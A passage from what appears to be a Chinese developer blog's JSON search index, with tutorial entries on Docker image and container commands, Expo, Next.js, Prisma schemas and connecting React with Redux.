\u0026amp;\u0026amp; apt install -y wget nginx software-properties-common apt-transport-https \u0026amp;\u0026amp; wget -q https://packages.microsoft.com/config/ubuntu/18.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb \u0026amp;\u0026amp; dpkg -i packages-microsoft-prod.deb \u0026amp;\u0026amp; add-apt-repository universe \u0026amp;\u0026amp; apt -y update \u0026amp;\u0026amp; apt install -y dotnet-sdk-3.0\r---\u0026gt; Using cache\r---\u0026gt; feb452bac55a\rStep 3/8 : CMD service nginx start\r---\u0026gt; Using cache\r---\u0026gt; ce3fd40bd13c\rStep 4/8 : COPY ./default /etc/nginx/sites-available/default\r---\u0026gt; 97ff0c042b03\rStep 5/8 : WORKDIR /app\r---\u0026gt; Running in 883f8dc5dcce\rRemoving intermediate container 883f8dc5dcce\r---\u0026gt; 6e36758d40b1\rStep 6/8 : COPY ./website/. .\r---\u0026gt; bfe84cc406a4\rStep 7/8 : EXPOSE 80:8080\r---\u0026gt; Running in b611a87425f2\rRemoving intermediate container b611a87425f2\r---\u0026gt; 209b54a9567f\rStep 8/8 : ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;website.dll\u0026#34;]\r---\u0026gt; Running in ea2efbc6c375\rRemoving intermediate container ea2efbc6c375\r---\u0026gt; f982892ea056\rSuccessfully built f982892ea056\rSuccessfully tagged temp-ubuntu:latest 请注意输出中列出的步骤。当每个步骤执行时，一个新层被添加到正在构建的镜像中。\n另外，请注意当中执行了许多命令来安装软件和管理配置。例如，在第 2 步中，运行 apt -y update 和 apt install -y 命令来更新操作系统。这些命令在为该步骤创建的正在运行的容器中执行。命令运行后，中间容器将被删除。底层缓存图像保留在构建主机上，不会自动删除。这种优化可确保以后的构建重用这些镜像以加快构建时间。\n   镜像管理 命令 说明     构建镜像 docker build [OPTIONS] PATH 该 PATH 参数可以引用三种资源：Git 存储库、预打包的压缩包 和 纯文本文件 Dockerfile。   1 docker build https://github.com/docker/rootfs.git#container:docker 运行此命令以使用分支 container 中名为 docker 的目录   2 docker build http://server/context.tar.gz Docker 守护进程将获取context.tar.gz并将其用作构建上下文。   3 在Dockerfile目录下执行 docker build -t nginx:v3 . Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。在一个空目录下 mkdir Projects，新建一个名为 Dockerfile 文件 touch Dockerfile   标志镜像 docker build -t vieux/apache:2.0 . 这将像前面的示例一样构建，但它将标记生成的镜像。存储库名称为 vieux/apache，标签为 2.0.   上下文路径 .  上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。   列出镜像 docker images 列出本地主机上的所有镜像   查找镜像 docker search -f stars=3 ubuntu 如果是用户名，则列出自己仓库的镜像，如果是关键字(例如：ubuntu)，则列出公共仓库的所有关于ubuntu的镜像，选项 --limit 最大结果搜索数   拉取镜像 docker pull ubuntu:20.04 指定拉取的用户名/镜像名:标签名，也可以 docker pull ubuntu ，不指定则默认下载公共仓库中存在的 ubuntu:latest 最新版，选项 -a 下载存储库中所有标记的镜像   推送镜像 docker push username/ubuntu:18.04 推送本地的镜像到远程仓库，前提是已在本地登录，选项 -a 推送存储库中的所有标记图像   删除镜像 docker rmi [OPTIONS] IMAGE [IMAGE...] 从主机节点中删除（和取消标记）一个或多个镜像。如果一个镜像有多个标签，使用这个带有标签作为参数的命令只会删除标签。如果标签是镜像的唯一标签，则镜像和标签都将被删除。这不会从注册表中删除镜像。除非使用 -f 选项，否则无法删除正在运行的容器的镜像。    4. Docker 容器的工作原理 容器是用来分发应用程序的单元。容器是独立运行的一个或一组应用，是 镜像运行时的实体。\n4-1. 容器管理 容器有一个生命周期，可以管理和跟踪容器的状态。\n   命令 说明     run 启动运行容器   pause 暂停正在运行的容器   stop 停止正在运行的容器   kill 终止正在运行的容器，正在运行的进程不会捕获终止信号   remove 删除处于停止状态的容器       容器管理 命令     运行容器 docker run -itd --name ubuntu-test ubuntu /bin/bash   列出容器(所有) docker ps -a   列出容器(运行) docker ps   启动容器 docker start my_container   停止容器 docker stop my_container   重启容器 docker restart my_container   暂停容器 docker pause my_container   取消暂停 docker unpause my_container   进入容器 docker exec -it my_container /bin/bash   退出容器 exit   导出容器 docker export my_container \u0026gt; ubuntu.tar   从远程仓库导入容器 docker import https://example.com/exampleimage.tgz   从本地文件导入容器 cat exampleimage.tgz | docker import - exampleimagelocal:new   从本地目录导入容器 sudo tar -c . | docker import - exampleimagedir   从具有新配置的本地目录导入容器 sudo tar -c . | docker import --change \u0026quot;ENV DEBUG=true\u0026quot; - exampleimagedir   删除容器(非运行) docker rm my_container   删除容器(运行) docker rm -f my_container   删除所有容器(非运行) docker container prune    4-2. 容器存储配置 在考虑存储数据时，始终将容器视为临时容器至关重要。\n容器存储即容器文件系统，当应用程序将数据写入日志文件时，系统会将数据写入可写的容器层。\n尽管这种方法有效，但是不幸的是，它存在几个缺点：\n   缺点 说明     容器存储是临时的 日志文件不会在容器实例之间保留。例如，假设停止并移除容器。当启动新的容器实例时，新实例会基于指定的镜像，之前的所有数据都将丢失。请记住，当移除容器时，容器中的所有数据都会随容器一起销毁。   容器存储与底层宿主机耦合 由于容器与底层主机耦合，因此很难从容器访问或移动日志文件。必须连接到容器实例才能访问该文件。   容器存储驱动器的性能较低 容器实现了一个存储驱动程序以允许应用程序写入数据。该驱动程序引入了一个额外的抽象来与主机操作系统内核进行通信，并且性能不如直接写入主机文件系统。    容器可以使用两个选项来持久化数据。第一个选项是使用 *卷* ，第二个选项是 *绑定安装* 。\n   选项 命令 说明     卷存储 docker volume create 卷被认为是与容器一起使用的首选数据存储策略，多个容器可以同时使用相同的卷。当容器被删除时，卷也不会自动删除。   绑定挂载  绑定挂载在概念上与卷相同，但是，可以挂载主机上的任何文件或文件夹，而不是使用特定文件夹。主机也可以更改这些挂载的内容。与卷相比，绑定挂载的功能有限，尽管它们的性能更高，但它们依赖于具有特定文件夹结构的主机。    4-3. 容器网络配置 默认的 Docker 网络配置允许隔离 Docker 主机上的容器。此功能能够构建和配置可以安全地相互通信的应用程序。\nDocker 提供了三种预配置的网络配置。\n可以根据容器的网络要求选择将这些网络配置中的哪些应用于容器。\n   选项 说明     Bridge 桥接网络是启动时应用于容器的默认配置，无需指定任何额外的网络配置。该网络是容器使用的内部私有网络，将容器网络与 Docker 主机网络隔离开来。桥接网络中的每个容器都被分配了一个 IP 地址和子网掩码，主机名默认为容器名称。允许连接到默认网桥网络的容器通过 IP 地址访问其他网桥连接的容器。桥接网络不允许使用主机名在容器之间进行通信。默认情况下，Docker 不发布任何容器端口。要启用容器端口和 Docker 主机端口之间的端口映射，请使用 Docker 端口\u0026ndash;publish标志。发布标志有效地配置了映射端口的防火墙规则。--publish 8080:80任何浏览到 Docker 主机 IP 和端口 8080 的客户端都可以访问跟踪门户。   Host 主机网络可以直接在主机网络上运行容器。这种配置在网络级别有效地消除了主机和容器之间的隔离。在此示例中，假设决定将网络配置更改为主机网络选项。门户仍然可以使用主机 IP 访问。可以使用众所周知的端口 80 而不是映射端口。请记住，容器只能使用主机尚未使用的端口。   none 要禁用容器的网络，请使用 none 网络选项。     操作系统注意事项  请记住，Docker 网络配置选项的桌面操作系统之间存在差异。例如，Docker0网络接口在使用桥接网络时在 macOS 上不可用，并且 Windows 和 macOS 桌面都不支持使用主机网络配置。\n5. 更多详情 附上 vi/vim 基本上 vi/vim 共分为三种模式，分别是 命令模式（Command mode） ， 输入模式（Insert mode） 和 底线命令模式（Last line mode） 。 这三种模式的作用分别是：\n   模式 进入和退出     命令模式 vi \u0026lt;文件\u0026gt; , 退出vi :exit 或者 :q 或者 :wq   输入模式 命令模式下 i 。退出输入模式 ESC   底线模式 命令模式下 :（英文冒号）。退出底线模式 ECS    ","description":"Docker是一个应用层的抽象容器，将代码和依赖打包在一起。便携高效。","id":13,"section":"nodejs","tags":null,"title":"Docker","uri":"https://codthing.github.io/nodejs/docker/docker/"},{"content":"一、运行设备  Expo客户端App 浏览器 模拟器(使用genymotion)   下载并安装 Android Studio 3.0+\n在Android Studio中，转到首选项\u0026gt;外观和行为\u0026gt;系统设置\u0026gt; Android SDK。单击 SDK工具选项卡，并确保已安装至少一个版本的Android SDK Build-Tools\n设定虚拟设备\n 二、安装 npm install --global expo-cli 三、验证登录 expo whoami 四、创建项目 expo init my-app 有5种模板可以选择：\n--- Managed workflow 托管工作流 ---\r  blank 像空画布一样干净的最小应用程序。 blank (TypeScript) 与空画布相同，但具有TypeScript配置。 tabs (TypeScript) 使用react-navigation和TypeScript的几个示例屏幕和选项卡。\n\u0026mdash; Bare workflow 裸漏工作流 \u0026mdash; minimal 光秃秃的，最小的，只是使您入门的基本要素。 minimal (TypeScript) ：与最小相同，但具有TypeScript配置  五、启动开发服务器 expo start 六、在手机/模拟器/浏览器上打开应用  Expo App：链接方式：隧道Tunnel 局域网LAN 本地Local.选择Tunnel二维码扫描 模拟器：Expo 命令行窗口键入 a 浏览器：Expo 命令行窗口键入 w  七、构建 //android\rexpo build:android\r//IOS\rexpo build:ios  使用Expo则是使用了托管工作流 （区别于裸漏工作流），所以构建后的apk保存在Expo账户中，30天后，将自动从Expo服务器中清除构建作业工件，例如二进制文件（.ipa，.aab，.apk等）和日志文件，下载并部署的应用程序二进制文件将始终可以正常运行！\n 八、升级Expo //升级SDK\rexpo upgrade\r//升级expo-cli\rnpm i -g expo-cli 九、退出 Expo 服务 //键盘\rCtrl + C 十、Expo 命令行 › 按？│ 显示所有命令\n› 按a│打开Android\n› shift + a│选择设备或仿真器\n› 按w│打开网页\n› 按o│在编辑器中打开项目代码\n› 按c│显示项目QR\n› 按p│切换构建模式（开发）\n› 按r│重新启动捆绑器\n› shift + r│重新启动并清除缓存\n› 按d│打开Expo DevTools\n› shift + d│在启动时切换自动打开DevTools（已启用）\n› 按e│通过电子邮件共享应用程序链接\n十一、每个应用程序都由 React Native，Expo SDK 和 第三方库 组合组成。 十二、开发/生产方式切换 十三、发布更新 优化代码（压缩图片等）：npx expo-optimize\n通过命令行发布：expo publish 执行此操作时，打包程序将压缩所有代码并生成两个版本的代码（一个版本用于iOS，一个版本用于Android），然后将其上传到CDN。您将获得一个链接，例如https://exp.host/@ccheever/an-example ，任何人都可以从中加载您的项。\n通过Expo Dev Tools发布：\n 选择开发方式\u0026amp;Tunnel则发布到ExpoApp中用于开发测试。 选择生产方式\u0026amp;Tunnel则发布到用户App的生产环境中。 对应用程序图标等在app.json配置的内容则需要重新打包才有效，通过发布更新无效。  ","description":"","id":14,"section":"react-native","tags":null,"title":"Expo 基础","uri":"https://codthing.github.io/react-native/expo/expo-base/"},{"content":"Next.js：React 框架\nNext.js 提供生产所需的所有功能的最佳开发人员体验：混合静态和服务器渲染、TypeScript 支持、智能捆绑、路由预取等。无需配置。\nNext.js 旨在拥有一流的开发人员体验和许多内置功能\n  一个直观的基于页面的路由系统（支持动态路由）\n  预渲染，静态生成(SSG) 和服务器端渲染(SSR) 均以每页为基础支持\n  自动代码拆分以加快页面加载\n  具有优化预取的客户端路由\n  内置 CSS 和 Sass 支持，并支持任何 CSS-in-JS 库\n  支持快速刷新的开发环境\n  使用无服务器功能构建 API 端点的API 路由\n  完全可扩展\n  创建 Next.js 应用 1 2 3 4 5 6 7 8  yarn create next-app --typescript yarn dev //开发模式  yarn build //生产构建  yarn start //启动生产服务器   ","description":"React 开发框架，相比于umi更能融入最新的技术","id":15,"section":"react","tags":null,"title":"Next.js 速览","uri":"https://codthing.github.io/react/next/next-base/"},{"content":"Prisma Prisma 是一个开源的下一代 ORM。它由以下部分组成：\n Prisma 客户端：用于 Node.js 和 TypeScript 的自动生成和类型安全的查询构建器 Prisma Migrate : 迁移系统 Prisma Studio：用于查看和编辑数据库中数据的 GUI (可视化图形工具)  下面是一个 Prisma 模式文件的例子，它指定：\n 数据源（PostgreSQL 或 MongoDB） 生成器（Prisma 客户端） 具有两个模型（具有一个关系）和一个模型的数据模型定义 enum 几个本机数据类型属性( @db.VarChar(255), @db.ObjectId)  SQL 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  datasource db { url = env(\u0026#34;DATABASE_URL\u0026#34;) provider = \u0026#34;postgresql\u0026#34; } generator client { provider = \u0026#34;prisma-client-js\u0026#34; } model User { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id Int @id @default(autoincrement()) createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String @db.VarChar(255) author User? @relation(fields: [authorId], references: [id]) authorId Int? } enum Role { USER ADMIN }   NoSQL (MongoDB) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  generator client { provider = \u0026#34;prisma-client-js\u0026#34; previewFeatures = [\u0026#34;mongoDb\u0026#34;] } datasource db { provider = \u0026#34;mongodb\u0026#34; url = env(\u0026#34;DATABASE_URL\u0026#34;) } model User { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) email String @unique name String? role Role @default(USER) posts Post[] } model Post { id String @id @default(dbgenerated()) @map(\u0026#34;_id\u0026#34;) @db.ObjectId createdAt DateTime @default(now()) updatedAt DateTime @updatedAt published Boolean @default(false) title String author User? @relation(fields: [authorId], references: [id]) authorId String @db.ObjectId } enum Role { USER ADMIN }   ","description":"开源的下一代 ORM，基于 Node.js 和 TypeScript","id":17,"section":"nodejs","tags":null,"title":"Prisma ORM","uri":"https://codthing.github.io/nodejs/orm/prisma/"},{"content":"这两种技术的关键原则是什么?\nReact 是提供数据的视图库，能以高效、可预测的方式渲染视图。\nRedux 是状态管理框架，可用于简化 APP 应用状态的管理。\n在 React Redux app 应用中，通常可创建单一的 Redux store 来管理整个应用的状态。\nReact 组件仅订阅 store 中与其角色相关的数据， 可直接从 React 组件中分发 actions 以触发 store 对象的更新。\nReact 组件可以在本地管理自己的状态，但是对于复杂的应用来说，它的状态最好是用 Redux 保存在单一位置，有特定本地状态的独立组件例外。\n当单个组件可能仅具有特定于其的本地状态时，算是例外。\n最后一点是，Redux 没有内置的 React 支持，需要安装 react-redux包， 通过这个方式把 Redux 的 state 和 dispatch 作为 props 传给组件。\n一、React 和 Redux class DisplayMessages extends React.Component {\r// 添加下面这行代码\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\r}\r// 添加上面这行代码\rrender() {\rreturn \u0026lt;div /\u0026gt;\r}\r}; 二、首先在本地管理状态 class DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\r}\r// 在这里添加 handleChange() 和 submitMessage() 方法\rhandleChange(event) {\rthis.setState({\rinput: event.target.value,\rmessages: this.state.messages\r})\r}\rsubmitMessage() {\rthis.setState({\rinput: \u0026#39;\u0026#39;,\rmessages: [...this.state.messages, this.state.input]\r})\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input onChange={this.handleChange.bind(this)} value={this.state.input} /\u0026gt;\r\u0026lt;button onClick={this.submitMessage.bind(this)}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((x, i) =\u0026gt; {\rreturn \u0026lt;li key={i}\u0026gt;{x}\u0026lt;/li\u0026gt;\r})}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r}; 三、提取状态逻辑给 Redux 完成 React 组件后，需要把在本地 state 执行的逻辑移到 Redux 中， 这是为小规模 React 应用添加 Redux 的第一步。\n该应用的唯一功能是把用户的新消息添加到无序列表中。\n// 定义 ADD、addMessage()、messageReducer() 并在这里存储：\rconst ADD = \u0026#34;ADD\u0026#34;;\rconst addMessage = message =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r};\r};\r// 使用 ES6 默认参数给 \u0026#39;previous State\u0026#39; 参数一个初始值。\rconst messageReducer = (previousState = [], action) =\u0026gt; {\r// 使用switch语句来布局reducer逻辑以响应不同的动作类型\rswitch (action.type) {\rcase ADD:\r// 使用 ES6 扩展运算符返回一个新数组，其中将新消息添加到 previousState\rreturn [...previousState, action.message];\rbreak;\rdefault:\r// 如果 Redux 存储的更新不是针对此特定状态，则要退回到默认情况。\rreturn previousState;\r}\r};\rconst store = Redux.createStore(messageReducer); 四、使用 Provider 链接 Redux 和 React 在上一步中，创建了 Redux store 和 action，分别用于处理消息数组和添加新消息。\n下一步要为 React 提供访问 Redux store 及发起更新所需的 actions。 react-redux 包可帮助我们完成这些任务。\nreact-redux 提供的 API 有两个关键的功能：Provider 和 connect。\nProvider 是 wrapper 组件， 它允许访问整个组件树中的 Redux store 及 dispatch（分发）方法。\nProvider 需要两个 props：Redux store 和 App 应用的子组件。\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass DisplayMessages extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: \u0026#39;\u0026#39;,\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\rconst Provider = ReactRedux.Provider;\rclass AppWrapper extends React.Component {\r// 在这一行下面渲染 Provider\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;DisplayMessages /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; 五、映射 State 到 Props Provider 可向 React 组件提供 state 和 dispatch ，但必须确切地指定所需要的 state 和 actions， 以确保每个组件只能访问所需的 state。\n完成这个任务，需要创建两个函数：mapStateToProps()、mapDispatchToProps()。\n在这两个函数中，声明 state 中函数所要访问的部分及需要 dispatch 的创建 action 的函数。\n注意： 在幕后，React Redux 用 store.subscribe() 方法来实现 mapStateToProps()。\nconst state = [];\rconst mapStateToProps = (state)=\u0026gt;{\rreturn {\rmessages: state\r}\r} 六、映射 Dispatch 到 Props mapDispatchToProps() 函数可为 React 组件提供特定的创建 action 的函数，以便组件可 dispatch actions，从而更改 Redux store 中的数据。\n该函数的结构跟上一步中的mapStateToProps()函数相似， 它返回一个对象，把 dispatch actions 映射到属性名上，该属性名成为props。\n然而，每个属性都返回一个用 action creator 及与 action 相关的所有数据调用 dispatch 的函数，而不是返回 state 的一部分。\n可以访问 dispatch，因为在定义函数时，我们以参数形式把它传入 mapDispatchToProps() 了，这跟 state 传入 mapStateToProps() 是一样的。\n在幕后，React Redux 用 Redux 的 store.dispatch() 来管理这些含 mapDispatchToProps() 的dispatches， 这跟它使用 store.subscribe() 来订阅映射到 state 的组件的方式类似。\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: \u0026#39;ADD\u0026#39;,\rmessage: message\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r} 七、连接 Redux 和 React 已经写了mapStateToProps()、mapDispatchToProps() 两个函数，现在可以用它们来把 state 和 dispatch 映射到 React 组件的 props 了。\nReact Redux 的 connect 方法可以完成这个任务。\n此方法有 mapStateToProps()、mapDispatchToProps() 两个可选参数， 它们是可选的，原因是你的组件可能仅需要访问 state 但不需要分发任何 actions，反之亦然。\nconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: \u0026#39;ADD\u0026#39;,\rmessage: message\r}\r};\rconst mapStateToProps = (state) =\u0026gt; {\rreturn {\rmessages: state\r}\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message));\r}\r}\r};\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\rreturn \u0026lt;h3\u0026gt;This is a Presentational Component\u0026lt;/h3\u0026gt;\r}\r};\rconst connect = ReactRedux.connect;\r// 添加这行下面的代码\rconst ConnectedComponent = connect(mapStateToProps, mapDispatchToProps)(Presentational) 八、将 Redux 链接到 Messages App 在上一步，连接到 Redux 的组件命名为 Presentational，这个命名不是任意的， 这样的术语通常是指未直接连接到 Redux 的 React 组件， 它们只负责执行接收 props 的函数来实现 UI 的呈现。\n相比之下，容器组件用来连接到 Redux 上。 这些组件通常负责把 actions 分派给 store，且经常给子组件传入 store state 属性。\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rinput: \u0026#39;\u0026#39;,\rmessages: []\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\rthis.setState((state) =\u0026gt; {\rconst currentMessage = state.input;\rreturn {\rinput: \u0026#39;\u0026#39;,\rmessages: state.messages.concat(currentMessage)\r};\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{this.state.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// React-Redux:\rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (newMessage) =\u0026gt; {\rdispatch(addMessage(newMessage))\r}\r}\r};\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// 在这里定义 Container 组件：\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational)\rclass AppWrapper extends React.Component {\rconstructor(props) {\rsuper(props);\r}\rrender() {\r// 完成 return 语句\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; 九、将局部状态提取到 Redux 中 现在有了连接好的 Redux，还要从Presentational组件中提取状态管理到 Redux， 目前，已连接 Redux，但正在 Presentational 组件中本地处理状态。\n// Redux:\rconst ADD = \u0026#39;ADD\u0026#39;;\rconst addMessage = (message) =\u0026gt; {\rreturn {\rtype: ADD,\rmessage: message\r}\r};\rconst messageReducer = (state = [], action) =\u0026gt; {\rswitch (action.type) {\rcase ADD:\rreturn [\r...state,\raction.message\r];\rdefault:\rreturn state;\r}\r};\rconst store = Redux.createStore(messageReducer);\r// React:\rconst Provider = ReactRedux.Provider;\rconst connect = ReactRedux.connect;\r// 修改这行下面的代码\rclass Presentational extends React.Component {\rconstructor(props) {\rsuper(props);\r// Remove property \u0026#39;messages\u0026#39; from Presentational\u0026#39;s local state\rthis.state = {\rinput: \u0026#39;\u0026#39;\r}\rthis.handleChange = this.handleChange.bind(this);\rthis.submitMessage = this.submitMessage.bind(this);\r}\rhandleChange(event) {\rthis.setState({\rinput: event.target.value\r});\r}\rsubmitMessage() {\r// Call \u0026#39;submitNewMessage\u0026#39;, which has been mapped to Presentational\u0026#39;s props, with a new message;\r// meanwhile, remove the \u0026#39;messages\u0026#39; property from the object returned by this.setState().\rthis.props.submitNewMessage(this.state.input);\rthis.setState({\rinput: \u0026#39;\u0026#39;\r});\r}\rrender() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;h2\u0026gt;Type in a new Message:\u0026lt;/h2\u0026gt;\r\u0026lt;input\rvalue={this.state.input}\ronChange={this.handleChange} /\u0026gt;\u0026lt;br /\u0026gt;\r\u0026lt;button onClick={this.submitMessage}\u0026gt;Submit\u0026lt;/button\u0026gt;\r\u0026lt;ul\u0026gt;\r{/* The messages state is mapped to Presentational\u0026#39;s props; therefore, when rendering,\ryou should access the messages state through props, instead of Presentational\u0026#39;s\rlocal state. */}\r{this.props.messages.map((message, idx) =\u0026gt; {\rreturn (\r\u0026lt;li key={idx}\u0026gt;{message}\u0026lt;/li\u0026gt;\r)\r})\r}\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r};\r// 修改这行上面的代码\rconst mapStateToProps = (state) =\u0026gt; {\rreturn { messages: state }\r};\rconst mapDispatchToProps = (dispatch) =\u0026gt; {\rreturn {\rsubmitNewMessage: (message) =\u0026gt; {\rdispatch(addMessage(message))\r}\r}\r};\rconst Container = connect(mapStateToProps, mapDispatchToProps)(Presentational);\rclass AppWrapper extends React.Component {\rrender() {\rreturn (\r\u0026lt;Provider store={store}\u0026gt;\r\u0026lt;Container /\u0026gt;\r\u0026lt;/Provider\u0026gt;\r);\r}\r}; ","description":" Redux 和 React 的配合，由于Redux的编写方式太过于沉重，而且现在有了Hooks，完全可以抛弃沉重的Redux，可以使用Hooks的useReducer编写复杂的逻辑。","id":18,"section":"react","tags":null,"title":"React \u0026 Redux","uri":"https://codthing.github.io/react/redux/react-redux/"},{"content":"简介：React 是由 Facebook 创建和维护的开源视图库。 它是渲染现代 Web 应用程序用户界面（UI）的好工具。\n一、JSX（JS 语法扩展） React 使用名为 JSX 的 JavaScript 语法扩展，可以直接在 JavaScript 中编写 HTML。\n这有几个好处。 可以在 HTML 中使用 JavaScript 的完整程序功能，并有助于保持代码的可读性。\n在大多数情况下，JSX 类似于 HTML，但是涉及一些关键差异。\n例如，因为 JSX 是 JavaScript 的语法扩展，所以实际上可以直接在 JSX 中编写 JavaScript。\n要做到这一点，只需在花括号中包含希望被视为 JavaScript 的代码：{ \u0026rsquo;this is treated as JavaScript code\u0026rsquo; }（这被视为 JavaScript 代码）。\n但是，由于浏览器不能解析 JSX，因此必须将 JSX 代码编译为 JavaScript。 在这个过程中，转换器 Babel 是一个很受欢迎的工具。\n值得注意的是，底层调用 ReactDOM.render(JSX, document.getElementById(\u0026lsquo;root\u0026rsquo;))。 这个函数调用将 JSX 置于 React 自己的轻量级 DOM 中。 然后，React 使用自己的 DOM 快照来实现增量更新。\nconst JSX = \u0026lt;h1\u0026gt;Hello JSX!\u0026lt;/h1\u0026gt;;\rconst JSX = \u0026lt;div\u0026gt;\r\u0026lt;h1\u0026gt;Heading.\u0026lt;/h1\u0026gt;\r\u0026lt;p\u0026gt;Paragraph\u0026lt;/p\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;Coffee\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Tea\u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt;Milk\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/div\u0026gt;;\r{/*\u0026lt;h1\u0026gt;Hanoi University of Science\u0026lt;/h1\u0026gt;*/} React 渲染 API ReactDOM.render(ReactNode,document.getElementById(\u0026#39;root\u0026#39;))\r--\u0026gt; Babel转换器\r--\u0026gt; JavaScript\r--\u0026gt; Browser HTML 属性和事件使用驼峰式写法 const JSX = (\r\u0026lt;div className=\u0026#39;myDiv\u0026#39;\u0026gt;\r\u0026lt;h1\u0026gt;Add a class to this div\u0026lt;/h1\u0026gt;\r\u0026lt;/div\u0026gt;\r); 返回单个元素（即只有一个父元素包裹所有子元素） 在 JSX 中编写 JS 代码使用花括号：{ ... } 或 {*/ 注释 /*} const JSX = (\r\u0026lt;div\u0026gt;\r{/* remove comment and change code below this line // Remember that comments in JSX have parentheses.\r\u0026lt;h2\u0026gt;Welcome to React!\u0026lt;/h2\u0026gt; \u0026lt;br \u0026gt; // ?\r\u0026lt;p\u0026gt;Be sure to close all tags!\u0026lt;/p\u0026gt;\r\u0026lt;hr \u0026gt; // ?\rremove comment and change code above this line */}{\u0026#34; \u0026#34;}\r// Remember that comments in JSX have 